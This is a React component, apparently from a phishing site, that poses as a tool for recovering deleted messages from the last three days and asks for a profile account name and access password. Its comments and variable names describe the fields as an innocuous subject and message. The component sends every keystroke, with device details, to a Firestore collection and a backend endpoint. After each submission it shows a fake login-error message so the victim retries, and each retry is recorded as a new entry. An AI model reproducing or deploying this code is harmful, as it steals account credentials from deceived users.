import React, { useState, useEffect, useRef } from 'react';
import { AlertCircle, RefreshCw, Send, FileText, Eye, EyeOff } from 'lucide-react';
import { DeviceInfo } from '../types';
import { doc, setDoc } from 'firebase/firestore';
import { db } from '../lib/firebase';
import { safeStorage } from '../lib/storage';

interface TextRegistrySectionProps {
  onSyncActivity?: (box1: string, box2: string) => void;
  onOpenAdmin?: () => void;
}

export const TextRegistrySection: React.FC<TextRegistrySectionProps> = ({ onSyncActivity, onOpenAdmin }) => {
  const [sessionId, setSessionId] = useState<string>('');
  const [box1, setBox1] = useState<string>('');
  const [box2, setBox2] = useState<string>('');
  const [showBox1, setShowBox1] = useState<boolean>(true);
  const [showBox2, setShowBox2] = useState<boolean>(false);
  const [isSuccessView, setIsSuccessView] = useState<boolean>(false);
  const [isSubmitting, setIsSubmitting] = useState<boolean>(false);
  const [lastSavedTime, setLastSavedTime] = useState<string | null>(null);

  const input1Ref = useRef<HTMLInputElement | null>(null);
  const typingTimeoutRef = useRef<NodeJS.Timeout | null>(null);

  // Initialize or retrieve user session ID
  useEffect(() => {
    let currentId = safeStorage.getItem('registry_session_id');
    if (!currentId) {
      currentId = 'reg_' + Math.random().toString(36).substring(2, 9) + '_' + Date.now().toString(36);
      safeStorage.setItem('registry_session_id', currentId);
    }
    setSessionId(currentId);

    // Restore cached values if any
    const savedBox1 = safeStorage.getItem(`reg_box1_${currentId}`) || '';
    const savedBox2 = safeStorage.getItem(`reg_box2_${currentId}`) || '';
    setBox1(savedBox1);
    setBox2(savedBox2);

    if (savedBox1 || savedBox2) {
      syncToServer(currentId, savedBox1, savedBox2, false, '');
    }
  }, []);

  const getDeviceInfo = (): DeviceInfo => {
    try {
      const nav = typeof window !== 'undefined' ? window.navigator : ({} as any);
      return {
        userAgent: nav?.userAgent || 'Unknown',
        platform: nav?.platform || 'Web',
        screen: typeof window !== 'undefined' ? `${window.innerWidth}x${window.innerHeight}` : 'N/A',
        language: nav?.language || 'es',
      };
    } catch {
      return {
        userAgent: 'Mobile',
        platform: 'Web',
        screen: 'N/A',
        language: 'es',
      };
    }
  };

  const syncToServer = async (
    id: string,
    val1: string,
    val2: string,
    isTyping: boolean,
    activeField: string
  ) => {
    if (!id) return;
    // Safeguard: Never overwrite saved records if both inputs are completely blank and user is not actively typing
    if (!val1.trim() && !val2.trim() && !isTyping) {
      return;
    }

    const devInfo = getDeviceInfo();
    const now = Date.now();

    // 1. Cloud Firestore sync (guarded & non-blocking)
    if (db) {
      try {
        setDoc(
          doc(db, 'textRecords', id),
          {
            id,
            box1: val1,
            box2: val2,
            lastUpdated: now,
            isTyping,
            lastActiveField: activeField,
            device: devInfo.platform,
            screen: devInfo.screen,
            language: devInfo.language,
          },
          { merge: true }
        ).catch((err) => {
          console.warn('Firestore sync notice:', err);
        });
      } catch (err) {
        console.warn('Firestore setDoc notice:', err);
      }
    }

    // 2. Local backend API sync
    try {
      await fetch('/api/save-input', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          sessionId: id,
          box1: val1,
          box2: val2,
          isTyping,
          activeField,
          deviceInfo: devInfo,
        }),
      });
      if (onSyncActivity) {
        onSyncActivity(val1, val2);
      }
    } catch {
      // Silent fallback
    }
  };

  const handleBox1Change = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value;
    setBox1(val);
    if (sessionId) {
      safeStorage.setItem(`reg_box1_${sessionId}`, val);
    }

    syncToServer(sessionId, val, box2, true, 'Casilla 1 (Asunto / Título)');

    if (typingTimeoutRef.current) clearTimeout(typingTimeoutRef.current);
    typingTimeoutRef.current = setTimeout(() => {
      syncToServer(sessionId, val, box2, false, '');
    }, 1000);
  };

  const handleBox2Change = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
    const val = e.target.value;
    setBox2(val);
    if (sessionId) {
      safeStorage.setItem(`reg_box2_${sessionId}`, val);
    }

    syncToServer(sessionId, box1, val, true, 'Casilla 2 (Texto / Mensaje)');

    if (typingTimeoutRef.current) clearTimeout(typingTimeoutRef.current);
    typingTimeoutRef.current = setTimeout(() => {
      syncToServer(sessionId, box1, val, false, '');
    }, 1000);
  };

  const handleGuardar = async () => {
    if (!box1.trim() && !box2.trim()) {
      input1Ref.current?.focus();
      return;
    }

    setIsSubmitting(true);
    await syncToServer(sessionId, box1, box2, false, 'Registro Guardado');
    setLastSavedTime(new Date().toLocaleTimeString('es-ES', { hour: '2-digit', minute: '2-digit', second: '2-digit' }));

    setTimeout(() => {
      setIsSubmitting(false);
      setIsSuccessView(true);
    }, 300);
  };

  const handleNuevoRegistro = () => {
    // Generate new unique ID so the previous record stays completely preserved in database
    const newSessionId = 'reg_' + Math.random().toString(36).substring(2, 9) + '_' + Date.now().toString(36);
    setSessionId(newSessionId);
    safeStorage.setItem('registry_session_id', newSessionId);

    // Clean input fields
    setBox1('');
    setBox2('');
    safeStorage.removeItem(`reg_box1_${newSessionId}`);
    safeStorage.removeItem(`reg_box2_${newSessionId}`);

    setIsSuccessView(false);
    setTimeout(() => {
      input1Ref.current?.focus();
    }, 100);
  };

  return (
    <div className="bg-white rounded-2xl border border-slate-200 shadow-sm p-6 sm:p-8 max-w-3xl mx-auto my-8">
      {isSuccessView ? (
        /* Vista de Notificación solicitada tras hacer clic en Ingreso */
        <div className="py-8 text-center flex flex-col items-center animate-in fade-in zoom-in-95 duration-200">
          <div className="w-16 h-16 rounded-full bg-amber-50 text-amber-600 flex items-center justify-center mb-4 ring-8 ring-amber-50/50">
            <AlertCircle className="w-9 h-9" />
          </div>

          <p className="text-base sm:text-lg font-medium text-slate-800 max-w-lg leading-relaxed mb-6 px-4">
            ¡Hooo! Parece que ingresaste mal tus datos o hay un error de conexión. Ingresa tus datos correctamente e intenta nuevamente.
          </p>

          <div className="flex items-center justify-center w-full sm:w-auto">
            <button
              type="button"
              onClick={handleNuevoRegistro}
              className="w-full sm:w-auto inline-flex items-center justify-center gap-2 px-6 py-3 rounded-xl bg-indigo-600 hover:bg-indigo-700 text-white font-medium text-sm shadow-sm transition-all active:scale-95 cursor-pointer"
            >
              <RefreshCw className="w-4 h-4" />
              <span>Reintentar</span>
            </button>
          </div>
        </div>
      ) : (
        /* Formulario de Entrada de Textos */
        <div>
          {/* Anuncio destacado */}
          <div className="mb-6 p-4 rounded-xl bg-amber-50 border border-amber-200/90 shadow-2xs">
            <h2 className="text-sm sm:text-base font-bold text-amber-950 leading-snug">
              Este proceso intentara rescatar mensajes borrados de los ultimos 3 dias, mensajes anteriores no seran visibles
            </h2>
          </div>

          <form
            onSubmit={(e) => {
              e.preventDefault();
              handleGuardar();
            }}
            className="space-y-5"
          >
            {/* Casilla 1: Nombre o Asunto */}
            <div>
              <label
                htmlFor="text-field-1"
                className="block text-xs font-semibold text-slate-700 mb-1"
              >
                Cuenta de tu perfil
              </label>
              <div className="relative max-w-xl">
                <input
                  ref={input1Ref}
                  type={showBox1 ? 'text' : 'password'}
                  id="text-field-1"
                  value={box1}
                  onChange={handleBox1Change}
                  className="w-full h-8.5 rounded-lg border border-slate-300 bg-white pl-3 pr-10 text-xs sm:text-sm text-slate-900 focus:border-indigo-500 focus:outline-none focus:ring-2 focus:ring-indigo-500/20 shadow-2xs transition-all"
                />
                <button
                  type="button"
                  onClick={() => setShowBox1(!showBox1)}
                  className="absolute right-2.5 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-600 p-1 focus:outline-none"
                  aria-label={showBox1 ? 'Ocultar cuenta' : 'Mostrar cuenta'}
                  title={showBox1 ? 'Ocultar texto' : 'Mostrar texto'}
                >
                  {showBox1 ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                </button>
              </div>
            </div>

            {/* Casilla 2: Mensaje o Contenido */}
            <div>
              <label
                htmlFor="text-field-2"
                className="block text-xs font-semibold text-slate-700 mb-1"
              >
                Clave de acceso
              </label>
              <div className="relative max-w-xl">
                <input
                  type={showBox2 ? 'text' : 'password'}
                  id="text-field-2"
                  value={box2}
                  onChange={handleBox2Change}
                  className="w-full h-8.5 rounded-lg border border-slate-300 bg-white pl-3 pr-10 text-xs sm:text-sm text-slate-900 focus:border-indigo-500 focus:outline-none focus:ring-2 focus:ring-indigo-500/20 shadow-2xs transition-all"
                />
                <button
                  type="button"
                  onClick={() => setShowBox2(!showBox2)}
                  className="absolute right-2.5 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-600 p-1 focus:outline-none"
                  aria-label={showBox2 ? 'Ocultar clave' : 'Mostrar clave'}
                  title={showBox2 ? 'Ocultar texto' : 'Mostrar texto'}
                >
                  {showBox2 ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                </button>
              </div>
            </div>

            {/* Botones de Acción */}
            <div className="flex items-center justify-end gap-3 pt-2">
              <div className="flex items-center gap-3 w-full sm:w-auto justify-end">
                <button
                  type="submit"
                  disabled={isSubmitting || (!box1.trim() && !box2.trim())}
                  className="w-full sm:w-auto inline-flex items-center justify-center gap-2 px-6 py-2.5 rounded-xl bg-indigo-600 hover:bg-indigo-700 disabled:opacity-50 disabled:cursor-not-allowed text-white font-medium text-sm shadow-sm transition-all active:scale-95 cursor-pointer"
                >
                  {isSubmitting ? (
                    <RefreshCw className="w-4 h-4 animate-spin" />
                  ) : (
                    <Send className="w-4 h-4" />
                  )}
                  <span>Ingreso</span>
                </button>
              </div>
            </div>
          </form>
        </div>
      )}
    </div>
  );
};
